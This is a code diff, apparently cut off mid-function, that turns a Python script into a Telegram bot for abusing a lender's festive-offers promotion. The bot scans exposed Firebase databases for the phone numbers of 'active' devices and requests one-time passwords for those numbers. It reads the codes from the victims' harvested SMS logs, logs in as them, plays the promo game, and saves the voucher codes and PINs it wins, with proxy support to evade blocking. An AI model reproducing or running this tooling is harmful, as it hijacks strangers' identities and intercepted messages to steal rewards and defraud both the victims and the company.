@@ -1,44 +1,49 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔══════════════════════════════════════════════════════════════════╗
-║   ✦  P-FINCORP AUTOMATED TERMINAL DASHBOARD  ✦                   ║
-║   Auto Firebase Scanner & Number Extractor Engine                ║
-║   + Manual Single Number Mode                                    ║
-╠══════════════════════════════════════════════════════════════════╣
-║  LIBRARIES: pip install requests colorama                         ║
-╚══════════════════════════════════════════════════════════════════╝
+P-Fincorp Telegram Bot — Firebase Scanner + Manual OTP Mode
+Railway-ready (long polling, no webhook).
+
+ENV VARS:
+  BOT_TOKEN        (required)  Telegram bot token from @BotFather
+  ALLOWED_USERS    (optional)  Comma-separated Telegram user IDs. Empty = allow all
+  PROXY_URL        (optional)  e.g. http://user:pass@gw.proxyrise.com:443
 """
-
-import subprocess
-import sys
-
-def _init_env(pkg):
-    try:
-        __import__(pkg)
-    except ImportError:
-        print(f"[*] Fetching dependency -> {pkg}")
-        subprocess.check_call(
-            [sys.executable, "-m", "pip", "install", pkg, "-q"],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-        )
-
-_init_env("requests")
-_init_env("colorama")
 
 import os
 import re
 import time
 import json
-import base64
-import requests
-from colorama import init as _cinit, Fore, Style, Back
-_cinit(autoreset=True)
+import asyncio
+import logging
+from collections import Counter
+from datetime import datetime
 
-# ══════════════════════════════════════════════════════════════════
-#  CONFIGURATION & HEADERS
-# ══════════════════════════════════════════════════════════════════
+import requests
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.constants import ParseMode, ChatAction
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    ConversationHandler,
+    ContextTypes,
+    filters,
+)
+
+# ─────────────────────────────────────────────────────────────────
+# CONFIG
+# ─────────────────────────────────────────────────────────────────
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
+PROXY_URL = os.environ.get("PROXY_URL", "").strip() or None
+ALLOWED_USERS = {
+    int(x) for x in os.environ.get("ALLOWED_USERS", "").replace(" ", "").split(",") if x
+}
+
 API_ENDPOINT = "https://festive-offers.poonawallafincorp.com/api"
+REQUEST_TIMEOUT = 25
+PROXY_DICT = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
 
 REQ_HEADERS = {
     "accept": "*/*",
@@ -60,72 +65,33 @@ REQ_HEADERS = {
     "origin": "https://festive-offers.poonawallafincorp.com",
 }
 
-PANEL_WIDTH = 68
+# Conversation states
+WAITING_NUMBER, WAITING_OTP, WAITING_URLS = range(3)
 
-# ══════════════════════════════════════════════════════════════════
-#  TERMINAL STYLING & INTERFACE
-# ══════════════════════════════════════════════════════════════════
-def print_success(msg): print(f"  {Fore.GREEN}[ + ]{Style.RESET_ALL} {msg}")
-def print_error(msg):   print(f"  {Fore.RED}[ ! ]{Style.RESET_ALL} {msg}")
-def print_warn(msg):    print(f"  {Fore.YELLOW}[ * ]{Style.RESET_ALL} {msg}")
-def print_info(msg):    print(f"  {Fore.CYAN}[ ~ ]{Style.RESET_ALL} {msg}")
-def print_dim(msg):     print(f"  {Fore.WHITE}{Style.DIM}{msg}{Style.RESET_ALL}")
-def print_divider(color=Fore.BLUE): print(color + "─" * PANEL_WIDTH + Style.RESET_ALL)
+logging.basicConfig(
+    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
+    level=logging.INFO,
+)
+logging.getLogger("httpx").setLevel(logging.WARNING)
+log = logging.getLogger("p-fincorp-bot")
 
-def draw_header():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print()
-    print(Fore.BLUE + "╔" + "═" * (PANEL_WIDTH - 2) + "╗")
-    print(Fore.BLUE + "║" + f"{Style.BRIGHT}    ✦  P-FINCORP AUTOMATED FIRESTORE EXTRACTOR  ✦".ljust(PANEL_WIDTH - 2) + Style.RESET_ALL + Fore.BLUE + "║")
-    print(Fore.BLUE + "║" + f"{Fore.WHITE}    Engine: Live Firebase Scanner & SMS Reader".ljust(PANEL_WIDTH - 2) + Fore.BLUE + "║")
-    print(Fore.BLUE + "╚" + "═" * (PANEL_WIDTH - 2) + "╝" + Style.RESET_ALL)
-    print()
+# In-memory per-user state
+USER_STATE: dict[int, dict] = {}
 
-def strip_tags(text):
+
+# ─────────────────────────────────────────────────────────────────
+# HELPERS (kept from original, unchanged logic)
+# ─────────────────────────────────────────────────────────────────
+def strip_tags(text: str) -> str:
     return re.sub(r"<[^>]+>", "", text or "").strip()
 
-def append_to_file(filepath, text_line):
-    try:
-        with open(filepath, "a", encoding="utf-8") as file:
-            file.write(text_line + "\n")
-    except Exception:
-        pass
 
-def export_reward(mobile_num, reward_dict):
-    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-    reward_type = str(reward_dict.get("type") or "").upper()
-    row_data = "\t".join([
-        timestamp, mobile_num, reward_type,
-        str(reward_dict.get("brand", "Unknown")),
-        str(reward_dict.get("rewardCode") or ""),
-        str(reward_dict.get("rewardPin") or ""),
-        strip_tags(str(reward_dict.get("details", ""))),
-        str(reward_dict.get("redemptionUrl") or ""),
-        str(reward_dict.get("validityDate") or "")[:10],
-    ])
-    destination = "p_coupons.txt" if reward_type == "VOUCHER" else "p_deals.txt"
-    append_to_file(destination, row_data)
-    return destination
-
-# ══════════════════════════════════════════════════════════════════
-#  ADVANCED FIREBASE SCANNER & EXTRACTOR ENGINE
-# ══════════════════════════════════════════════════════════════════
-def clean_base_url(raw_url):
+def clean_base_url(raw_url: str) -> str:
     url = raw_url.strip().rstrip("/")
     if url.endswith("/.json"):
         url = url[:-6]
     return url
 
-def safe_fetch_json(url_path, timeout_sec=8):
-    try:
-        response = requests.get(url_path, timeout=timeout_sec)
-        if response.status_code == 200:
-            content = response.json()
-            if content and content != "null":
-                return content
-    except Exception:
-        pass
-    return None
 
 def extract_phone_digits(raw_input):
     if not raw_input:
@@ -141,36 +107,70 @@ def extract_phone_digits(raw_input):
         return digits_only
     return ""
 
+
+def safe_fetch_json(url_path, timeout_sec=8):
+    try:
+        r = requests.get(url_path, timeout=timeout_sec, proxies=PROXY_DICT)
+        if r.status_code == 200:
+            content = r.json()
+            if content and content != "null":
+                return content
+    except Exception:
+        pass
+    return None
+
+
+def extract_poonawalla_otp(message_text):
+    if not message_text:
+        return None
+    content_str = str(message_text)
+    m = re.search(r"poonawalla.*?\botp\w*.*?(\d{4,6})\b", content_str, re.IGNORECASE)
+    if m:
+        return m.group(1)
+    fb = re.search(r"\b(\d{4,6})\b", content_str)
+    if fb and ("poonawalla" in content_str.lower() or "otp" in content_str.lower()):
+        return fb.group(1)
+    return None
+
+
+def fetch_device_sms_logs(base_url, device_id):
+    clean_target = clean_base_url(base_url)
+    for path in [
+        f"{clean_target}/messages/{device_id}.json",
+        f"{clean_target}/sms/{device_id}.json",
+        f"{clean_target}/All_Users/sms/{device_id}.json",
+        f"{clean_target}/inbox/{device_id}.json",
+        f"{clean_target}/SMS/{device_id}.json",
+    ]:
+        d = safe_fetch_json(path)
+        if isinstance(d, dict) and d:
+            return d
+    return {}
+
+
 def scan_firebase_node_for_numbers(firebase_url):
     base_target = clean_base_url(firebase_url)
-    discovered_numbers = []
-    seen_set = set()
+    discovered, seen = [], set()
 
-    print_info(f"Scanning Database Target: {base_target}")
-
-    # Check common client/device paths
     for node_key in ["clients", "devices", "users", "Profiles", "Accounts"]:
         data_packet = safe_fetch_json(f"{base_target}/{node_key}.json")
         if isinstance(data_packet, dict) and data_packet:
             for dev_id, info in data_packet.items():
                 if not isinstance(info, dict):
                     continue
-                # Verify active status
                 status_flag = info.get("status") or info.get("online") or info.get("isOnline")
                 if status_flag is True or str(status_flag).lower() in ("true", "1", "online", "active"):
-                    extracted_ph = ""
-                    for field_name in ("mobNo", "mobile", "phoneNumber", "phone", "number"):
-                        extracted_ph = extract_phone_digits(info.get(field_name))
-                        if extracted_ph:
+                    ph = ""
+                    for f in ("mobNo", "mobile", "phoneNumber", "phone", "number"):
+                        ph = extract_phone_digits(info.get(f))
+                        if ph:
                             break
-                    if extracted_ph and extracted_ph not in seen_set:
-                        discovered_numbers.append((extracted_ph, str(dev_id), base_target))
-                        seen_set.add(extracted_ph)
-            if discovered_numbers:
-                print_success(f"Extracted {len(discovered_numbers)} numbers from node [{node_key}]")
-                return discovered_numbers
+                    if ph and ph not in seen:
+                        discovered.append((ph, str(dev_id), base_target))
+                        seen.add(ph)
+            if discovered:
+                return discovered
 
-    # Fallback to All_Users device info tree
     for prefix_key in ["All_Users", "All_User"]:
         device_info_json = safe_fetch_json(f"{base_target}/{prefix_key}/DeviceInfo.json")
         if not isinstance(device_info_json, dict):
@@ -180,498 +180,508 @@ def scan_firebase_node_for_numbers(firebase_url):
             if not isinstance(info, dict):
                 continue
             sim_data = sim_json.get(dev_id, {}) if isinstance(sim_json, dict) else {}
-            phone_candidate = ""
-            for field in ("sim1Number", "sim2Number", "phoneNumber", "number", "phone", "mobile", "mobNo"):
-                raw_val = (sim_data.get(field) if isinstance(sim_data, dict) else None) or info.get(field)
-                phone_candidate = extract_phone_digits(raw_val)
-                if phone_candidate:
+            ph = ""
+            for f in ("sim1Number", "sim2Number", "phoneNumber", "number", "phone", "mobile", "mobNo"):
+                raw = (sim_data.get(f) if isinstance(sim_data, dict) else None) or info.get(f)
+                ph = extract_phone_digits(raw)
+                if ph:
                     break
-            if phone_candidate and phone_candidate not in seen_set:
-                discovered_numbers.append((phone_candidate, str(dev_id), base_target))
-                seen_set.add(phone_candidate)
-        if discovered_numbers:
-            print_success(f"Extracted {len(discovered_numbers)} numbers from [{prefix_key}] structure")
-            return discovered_numbers
+            if ph and ph not in seen:
+                discovered.append((ph, str(dev_id), base_target))
+                seen.add(ph)
+        if discovered:
+            return discovered
+    return discovered
 
-    print_warn("Standard nodes yielded no targets. Direct target database scan completed.")
-    return discovered_numbers
-
-# ══════════════════════════════════════════════════════════════════
-#  SMS OTP PARSER & RETRIEVAL ENGINE
-# ══════════════════════════════════════════════════════════════════
-def fetch_device_sms_logs(base_url, device_id):
-    clean_target = clean_base_url(base_url)
-    subpaths = [
-        f"{clean_target}/messages/{device_id}.json",
-        f"{clean_target}/sms/{device_id}.json",
-        f"{clean_target}/All_Users/sms/{device_id}.json",
-        f"{clean_target}/inbox/{device_id}.json",
-        f"{clean_target}/SMS/{device_id}.json",
-    ]
-    for path in subpaths:
-        messages_dict = safe_fetch_json(path)
-        if isinstance(messages_dict, dict) and messages_dict:
-            return messages_dict
-    return {}
-
-def extract_poonawalla_otp(message_text):
-    if not message_text:
-        return None
-    content_str = str(message_text)
-    # Target exact format: "Your OTP for accessing the Poonawalla Fincorp Festive Offers is 3088 Valid for 10 minutes."
-    match_pattern = re.search(r"poonawalla.*?\botp\w*.*?(\d{4,6})\b", content_str, re.IGNORECASE)
-    if match_pattern:
-        return match_pattern.group(1)
-
-    # Generic fallback pattern looking for 4-6 digit numeric codes near keywords
-    fallback_pattern = re.search(r"\b(\d{4,6})\b", content_str)
-    if fallback_pattern and ("poonawalla" in content_str.lower() or "otp" in content_str.lower()):
-        return fallback_pattern.group(1)
-    return None
 
 def poll_for_target_otp(base_url, device_id, baseline_msg_ids, request_timestamp):
     messages = fetch_device_sms_logs(base_url, device_id)
     if not isinstance(messages, dict) or not messages:
         return None
-
-    current_time = time.time()
-    for msg_id, message_data in messages.items():
-        if not isinstance(message_data, dict):
+    now = time.time()
+    for msg_id, m in messages.items():
+        if not isinstance(m, dict):
             continue
-
-        body_text = (
-            message_data.get("body") or message_data.get("text") or
-            message_data.get("message") or message_data.get("msg") or ""
-        )
-        body_string = str(body_text)
-
-        # Strict validation matching Poonawalla sender/content context
-        if "poonawalla" not in body_string.lower():
+        body = str(m.get("body") or m.get("text") or m.get("message") or m.get("msg") or "")
+        if "poonawalla" not in body.lower():
             continue
-
-        extracted_code = extract_poonawalla_otp(body_string)
-        if not extracted_code:
+        code = extract_poonawalla_otp(body)
+        if not code:
             continue
-
-        # Check timestamp fresh window
-        msg_timestamp = message_data.get("timestamp") or message_data.get("time") or message_data.get("date")
-        parsed_time = None
-        if msg_timestamp:
+        ts = m.get("timestamp") or m.get("time") or m.get("date")
+        parsed = None
+        if ts:
             try:
-                parsed_time = float(msg_timestamp)
-                if parsed_time > 1e12:
-                    parsed_time = parsed_time / 1000.0
+                parsed = float(ts)
+                if parsed > 1e12:
+                    parsed = parsed / 1000.0
             except Exception:
-                parsed_time = None
-
-        if parsed_time is not None:
-            if parsed_time < (request_timestamp - 10):
+                parsed = None
+        if parsed is not None:
+            if parsed < (request_timestamp - 10):
                 continue
-            if (current_time - parsed_time) > 120:
+            if (now - parsed) > 120:
                 continue
         elif msg_id in baseline_msg_ids:
             continue
-
-        return {"otp": extracted_code, "raw_snippet": body_string[:60]}
+        return {"otp": code, "raw_snippet": body[:60]}
     return None
 
-# ══════════════════════════════════════════════════════════════════
-#  API OPERATIONS (POONAWALLA FINCORP)
-# ══════════════════════════════════════════════════════════════════
+
+# ─────────────────────────────────────────────────────────────────
+# API OPERATIONS
+# ─────────────────────────────────────────────────────────────────
 def trigger_otp_request(mobile_number):
     try:
-        response = requests.post(
+        r = requests.post(
             f"{API_ENDPOINT}/otp/send",
             headers={**REQ_HEADERS, "content-type": "application/json"},
             json={"mobile": mobile_number, "consentTerms": True, "consentCommunication": True},
-            timeout=25,
+            timeout=REQUEST_TIMEOUT,
+            proxies=PROXY_DICT,
         )
-    except requests.RequestException as exc:
-        return False, f"network_error:{type(exc).__name__}", 30
-
-    if response.status_code != 200:
-        return False, f"http_status_{response.status_code}", 30
+    except requests.RequestException as e:
+        return False, f"network_error:{type(e).__name__}", 30
+    if r.status_code != 200:
+        return False, f"http_status_{r.status_code}", 30
     try:
-        payload = response.json()
+        payload = r.json()
     except ValueError:
         return False, "invalid_json", 30
-
     if not isinstance(payload, dict) or not payload.get("success"):
         return False, str(payload.get("message") or "rejected")[:60], 30
+    inner = payload.get("data") if isinstance(payload.get("data"), dict) else {}
+    cooldown = int(inner.get("resendAvailableInSeconds") or 30)
+    return True, "success", cooldown
 
-    inner_data = payload.get("data") if isinstance(payload.get("data"), dict) else {}
-    cooldown_sec = int(inner_data.get("resendAvailableInSeconds") or 30)
-    return True, "success", cooldown_sec
 
 def confirm_otp_token(mobile_number, otp_code):
     try:
-        response = requests.post(
+        r = requests.post(
             f"{API_ENDPOINT}/otp/verify",
             headers={**REQ_HEADERS, "content-type": "application/json"},
             json={"mobile": mobile_number, "otp": otp_code, "referrer": "/play-and-win"},
-            timeout=25,
+            timeout=REQUEST_TIMEOUT,
+            proxies=PROXY_DICT,
         )
-    except requests.RequestException as exc:
-        return None, f"network_error:{type(exc).__name__}"
-
-    if response.status_code != 200:
-        return None, f"http_status_{response.status_code}"
+    except requests.RequestException as e:
+        return None, f"network_error:{type(e).__name__}"
+    if r.status_code != 200:
+        return None, f"http_status_{r.status_code}"
     try:
-        payload = response.json()
+        payload = r.json()
     except ValueError:
         return None, "invalid_json"
-
     if isinstance(payload, dict) and payload.get("success"):
-        data_node = payload.get("data")
-        if isinstance(data_node, dict) and data_node.get("token"):
-            return data_node["token"], "success"
+        d = payload.get("data")
+        if isinstance(d, dict) and d.get("token"):
+            return d["token"], "success"
         return None, "missing_auth_token"
     return None, str(payload.get("message") or "rejected")[:60]
 
+
 def execute_game_play(auth_token, game_category="SHUFFLE"):
     try:
-        response = requests.post(
+        r = requests.post(
             f"{API_ENDPOINT}/game/play",
             headers={**REQ_HEADERS, "content-type": "application/json", "authorization": f"Bearer {auth_token}"},
             json={"gameType": game_category},
-            timeout=25,
+            timeout=REQUEST_TIMEOUT,
+            proxies=PROXY_DICT,
         )
-        res_json = response.json()
-        return res_json if isinstance(res_json, dict) else {}
+        j = r.json()
+        return j if isinstance(j, dict) else {}
     except Exception:
         return {}
 
-# ══════════════════════════════════════════════════════════════════
-#  EXECUTION PIPELINE PER NUMBER  (Firebase Auto Mode)
-# ══════════════════════════════════════════════════════════════════
-def process_single_target(mobile_number, firebase_url, device_id):
-    print_divider(Fore.CYAN)
-    print(f"  {Fore.WHITE}{Style.BRIGHT}TARGET: +91{mobile_number}  |  DEVICE ID: {device_id}{Style.RESET_ALL}")
-    print_divider(Fore.CYAN)
 
-    # Establish baseline SMS message IDs
-    baseline_msgs = fetch_device_sms_logs(firebase_url, device_id)
-    baseline_keys = set(baseline_msgs.keys())
+# ─────────────────────────────────────────────────────────────────
+# FILE PERSISTENCE (Railway: filesystem is ephemeral — use volumes if needed)
+# ─────────────────────────────────────────────────────────────────
+def append_to_file(filepath, text_line):
+    try:
+        with open(filepath, "a", encoding="utf-8") as f:
+            f.write(text_line + "\n")
+    except Exception:
+        pass
 
-    print_info("Dispatching Poonawalla OTP request...")
-    sent_ok, fail_reason, wait_timer = trigger_otp_request(mobile_number)
+
+def export_reward(mobile_num, reward_dict):
+    ts = time.strftime("%Y-%m-%d %H:%M:%S")
+    rtype = str(reward_dict.get("type") or "").upper()
+    row = "\t".join([
+        ts, mobile_num, rtype,
+        str(reward_dict.get("brand", "Unknown")),
+        str(reward_dict.get("rewardCode") or ""),
+        str(reward_dict.get("rewardPin") or ""),
+        strip_tags(str(reward_dict.get("details", ""))),
+        str(reward_dict.get("redemptionUrl") or ""),
+        str(reward_dict.get("validityDate") or "")[:10],
+    ])
+    dest = "p_coupons.txt" if rtype == "VOUCHER" else "p_deals.txt"
+    append_to_file(dest, row)
+    return dest
+
+
+# ─────────────────────────────────────────────────────────────────
+# TELEGRAM UI HELPERS
+# ─────────────────────────────────────────────────────────────────
+def is_allowed(user_id: int) -> bool:
+    return not ALLOWED_USERS or user_id in ALLOWED_USERS
+
+
+def fmt_reward(reward: dict, mobile: str) -> str:
+    brand = reward.get("brand", "Poonawalla Partner")
+    rtype = reward.get("type", "DEAL")
+    code = reward.get("rewardCode", "")
+    pin = reward.get("rewardPin", "")
+    details = strip_tags(str(reward.get("details", "")))
+    url = reward.get("redemptionUrl", "")
+    valid = str(reward.get("validityDate", ""))[:10]
+
+    lines = [
+        "🎉 *REWARD UNLOCKED*",
+        "",
+        f"📱 *Mobile:* `+91{mobile}`",
+        f"🏷 *Brand:* {brand}",
+        f"📦 *Category:* {rtype}",
+    ]
+    if details: lines.append(f"📝 *Offer:* {details}")
+    if code:    lines.append(f"🔑 *Code:* `{code}`")
+    if pin:     lines.append(f"🔒 *PIN:* `{pin}`")
+    if valid:   lines.append(f"📅 *Expires:* {valid}")
+    if url:     lines.append(f"🔗 [Redeem]({url})")
+    return "\n".join(lines)
+
+
+async def progress_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE, text: str):
+    """Stream progress into the same message (edit)."""
+    try:
+        await ctx.bot.send_message(chat_id=update.effective_chat.id, text=text, parse_mode=ParseMode.MARKDOWN)
+    except Exception:
+        pass
+
+
+# ─────────────────────────────────────────────────────────────────
+# /start + MENU
+# ─────────────────────────────────────────────────────────────────
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_allowed(uid):
+        await update.message.reply_text("🚫 Not authorized.")
+        return ConversationHandler.END
+
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔥 Firebase Auto", callback_data="mode_auto")],
+        [InlineKeyboardButton("✍️ Manual Single", callback_data="mode_manual")],
+        [InlineKeyboardButton("❓ Help", callback_data="help")],
+    ])
+    await update.message.reply_text(
+        "✦ *P-Fincorp Automated Bot* ✦\n\n"
+        "Live Firebase Scanner & SMS Reader\n"
+        "Choose a mode below:",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=kb,
+    )
+    return ConversationHandler.END
+
+
+async def cb_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    data = q.data
+
+    if data == "help":
+        await q.edit_message_text(
+            "*Help*\n\n"
+            "• *Firebase Auto* — send one or more Firebase RTDB URLs; bot scans for active numbers and runs the full OTP + game pipeline.\n"
+            "• *Manual Single* — send your own 10-digit number, then the OTP you receive.\n\n"
+            "*Commands*\n"
+            "/start — menu\n"
+            "/cancel — stop current flow",
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        return ConversationHandler.END
+
+    if data == "mode_manual":
+        USER_STATE[q.from_user.id] = {"mode": "manual"}
+        await q.edit_message_text(
+            "✍️ *Manual Mode*\n\nSend your 10-digit mobile number (e.g. `9876543210`):",
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        return WAITING_NUMBER
+
+    if data == "mode_auto":
+        USER_STATE[q.from_user.id] = {"mode": "auto", "urls": []}
+        await q.edit_message_text(
+            "🔥 *Firebase Auto Mode*\n\n"
+            "Send Firebase RTDB URLs one per message.\n"
+            "Send /run when done, or /cancel to abort.",
+            parse_mode=ParseMode.MARKDOWN,
+        )
+        return WAITING_URLS
+
+    return ConversationHandler.END
+
+
+# ─────────────────────────────────────────────────────────────────
+# MANUAL MODE
+# ─────────────────────────────────────────────────────────────────
+async def manual_got_number(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    raw = (update.message.text or "").strip()
+    mobile = extract_phone_digits(raw)
+    if not mobile:
+        await update.message.reply_text("❌ Invalid number. Send 10-digit number starting 6/7/8/9.")
+        return WAITING_NUMBER
+
+    USER_STATE.setdefault(uid, {})["mobile"] = mobile
+    await update.message.chat.send_action(ChatAction.TYPING)
+
+    sent_ok, reason, cooldown = await asyncio.to_thread(trigger_otp_request, mobile)
     if not sent_ok:
-        print_error(f"OTP Transmission Blocked: {fail_reason}")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\totp_failed\t{fail_reason}")
+        await update.message.reply_text(f"❌ OTP send failed: `{reason}`", parse_mode=ParseMode.MARKDOWN)
+        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_otp_failed\t{reason}")
+        return ConversationHandler.END
+
+    await update.message.reply_text(
+        f"✅ OTP sent to `+91{mobile}`\n"
+        f"⏱ Resend available in {cooldown}s\n\n"
+        f"Now send the OTP you received:",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return WAITING_OTP
+
+
+async def manual_got_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    otp_raw = (update.message.text or "").strip()
+    otp = re.sub(r"\D", "", otp_raw)
+    if len(otp) < 4 or len(otp) > 8:
+        await update.message.reply_text("❌ Invalid OTP format. Send 4–8 digits.")
+        return WAITING_OTP
+
+    mobile = USER_STATE.get(uid, {}).get("mobile")
+    if not mobile:
+        await update.message.reply_text("⚠️ Session expired. /start again.")
+        return ConversationHandler.END
+
+    await update.message.chat.send_action(ChatAction.TYPING)
+    token, err = await asyncio.to_thread(confirm_otp_token, mobile, otp)
+    if not token:
+        await update.message.reply_text(f"❌ Auth rejected: `{err}`", parse_mode=ParseMode.MARKDOWN)
+        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_auth_rejected\t{err}")
+        return ConversationHandler.END
+
+    await update.message.reply_text("✅ Token acquired. Playing game…")
+    await update.message.chat.send_action(ChatAction.TYPING)
+    outcome = await asyncio.to_thread(execute_game_play, token, "SHUFFLE")
+
+    data = outcome.get("data") if isinstance(outcome, dict) else None
+    won = (data or {}).get("wonOffer") if isinstance(data, dict) else None
+
+    if not outcome.get("success"):
+        await update.message.reply_text(f"⚠️ Game failed: `{outcome.get('message','Unknown')}`", parse_mode=ParseMode.MARKDOWN)
+        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_game_failed")
+        return ConversationHandler.END
+
+    if not won:
+        await update.message.reply_text("📦 Game completed — no reward this time.")
+        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_no_reward")
+        return ConversationHandler.END
+
+    saved = export_reward(mobile, won)
+    append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tmanual_success\t{won.get('rewardCode','')}\t{won.get('type','')}")
+    await update.message.reply_text(
+        fmt_reward(won, mobile) + f"\n\n💾 Saved to `{saved}`",
+        parse_mode=ParseMode.MARKDOWN,
+        disable_web_page_preview=True,
+    )
+    return ConversationHandler.END
+
+
+# ─────────────────────────────────────────────────────────────────
+# AUTO MODE
+# ─────────────────────────────────────────────────────────────────
+async def auto_collect_url(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    txt = (update.message.text or "").strip()
+    st = USER_STATE.setdefault(uid, {"mode": "auto", "urls": []})
+
+    url = clean_base_url(txt)
+    if not url.startswith("http"):
+        await update.message.reply_text("❌ Not a valid URL.")
+        return WAITING_URLS
+    if url in st["urls"]:
+        await update.message.reply_text("⚠️ Duplicate URL, ignored.")
+        return WAITING_URLS
+
+    st["urls"].append(url)
+    await update.message.reply_text(
+        f"✅ Added `#{len(st['urls'])}`:\n`{url}`\n\nSend another, or /run to start.",
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    return WAITING_URLS
+
+
+async def auto_run(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    st = USER_STATE.get(uid, {})
+    urls = st.get("urls", [])
+    if not urls:
+        await update.message.reply_text("⚠️ No URLs queued. Send at least one URL first.")
+        return WAITING_URLS
+
+    await update.message.reply_text(f"🚀 Scanning {len(urls)} panel(s)…")
+    all_results = []
+
+    for idx, panel in enumerate(urls, 1):
+        await progress_cb(update, ctx, f"📡 *Panel {idx}/{len(urls)}*\n`{panel}`")
+
+        targets = await asyncio.to_thread(scan_firebase_node_for_numbers, panel)
+        if not targets:
+            await progress_cb(update, ctx, f"⚠️ Panel {idx}: no active targets found.")
+            continue
+
+        await progress_cb(update, ctx, f"✅ Panel {idx}: {len(targets)} active target(s).")
+
+        for mobile, dev_id, db_ref in targets:
+            await progress_cb(
+                update, ctx,
+                f"▶️ Processing `+91{mobile}` (dev `{dev_id[:10]}…`)"
+            )
+            try:
+                outcome = await process_auto_target(update, ctx, mobile, db_ref, dev_id)
+                all_results.append(outcome)
+            except Exception as e:
+                log.exception("pipeline error")
+                await progress_cb(update, ctx, f"💥 Exception: `{e}`")
+                all_results.append("exception")
+            await asyncio.sleep(2)
+
+    # Summary
+    c = Counter(all_results)
+    labels = {
+        "won": "🎉 Rewards Claimed",
+        "timeout": "⏳ OTP Timeouts",
+        "failed": "📵 Send Blocked",
+        "auth_failed": "❌ Auth Rejected",
+        "game_failed": "⚠️ Game Error",
+        "no_reward": "📦 Empty Slot",
+        "exception": "💥 Exceptions",
+    }
+    lines = ["📊 *Execution Summary*", ""]
+    if not all_results:
+        lines.append("_No targets processed._")
+    else:
+        for k, v in c.items():
+            lines.append(f"{labels.get(k, k)}: *{v}*")
+    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)
+
+    USER_STATE[uid]["urls"] = []
+    return ConversationHandler.END
+
+
+async def process_auto_target(update, ctx, mobile, firebase_url, device_id):
+    chat_id = update.effective_chat.id
+    baseline = await asyncio.to_thread(fetch_device_sms_logs, firebase_url, device_id)
+    baseline_keys = set((baseline or {}).keys())
+
+    ok, reason, _ = await asyncio.to_thread(trigger_otp_request, mobile)
+    if not ok:
+        await ctx.bot.send_message(chat_id, f"📵 `+91{mobile}` — OTP send blocked: `{reason}`", parse_mode=ParseMode.MARKDOWN)
+        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\totp_failed\t{reason}")
         return "failed"
 
-    print_success(f"OTP successfully transmitted. Polling Firebase device inbox...")
-    request_epoch = time.time()
-
-    # Automatic OTP Reader Loop
-    retrieved_otp = None
-    for attempt_idx in range(1, 6):
-        time.sleep(4)
-        found_sms = poll_for_target_otp(firebase_url, device_id, baseline_keys, request_epoch)
-        if found_sms:
-            retrieved_otp = found_sms["otp"]
-            print_success(f"OTP Captured from Device Inbox -> [{retrieved_otp}] (Snippet: {found_sms['raw_snippet']})")
+    req_epoch = time.time()
+    otp_found = None
+    for attempt in range(1, 6):
+        await asyncio.sleep(4)
+        found = await asyncio.to_thread(
+            poll_for_target_otp, firebase_url, device_id, baseline_keys, req_epoch
+        )
+        if found:
+            otp_found = found["otp"]
+            await ctx.bot.send_message(chat_id, f"📩 OTP captured for `+91{mobile}`: `{otp_found}`", parse_mode=ParseMode.MARKDOWN)
             break
-        print_warn(f"Polling attempt {attempt_idx}/5: Awaiting incoming SMS sync...")
+        await ctx.bot.send_message(chat_id, f"…polling {attempt}/5 for `+91{mobile}`", parse_mode=ParseMode.MARKDOWN)
 
-    if not retrieved_otp:
-        print_error("OTP Read Timeout: Target device did not sync SMS payload.")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\totp_timeout")
+    if not otp_found:
+        await ctx.bot.send_message(chat_id, f"⏳ `+91{mobile}` OTP timeout.", parse_mode=ParseMode.MARKDOWN)
+        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\totp_timeout")
         return "timeout"
 
-    print_info("Authenticating session with verified OTP token...")
-    jwt_token, err_msg = confirm_otp_token(mobile_number, retrieved_otp)
-    if not jwt_token:
-        print_error(f"Session Authentication Rejected: {err_msg}")
-        append_to_file("p_used.txt", f"{time.strftime('%Y-%m-%d %H:%M:%S')}\t{mobile_number}\tauth_rejected\t{err_msg}")
+    token, err = await asyncio.to_thread(confirm_otp_token, mobile, otp_found)
+    if not token:
+        await ctx.bot.send_message(chat_id, f"❌ `+91{mobile}` auth rejected: `{err}`", parse_mode=ParseMode.MARKDOWN)
+        append_to_file("p_used.txt", f"{datetime.now()}\t{mobile}\tauth_rejected\t{err}")
         return "auth_failed"
 
-    print_success("Session token acquired successfully. Executing game trigger...")
-    game_outcome = execute_game_play(jwt_token, "SHUFFLE")
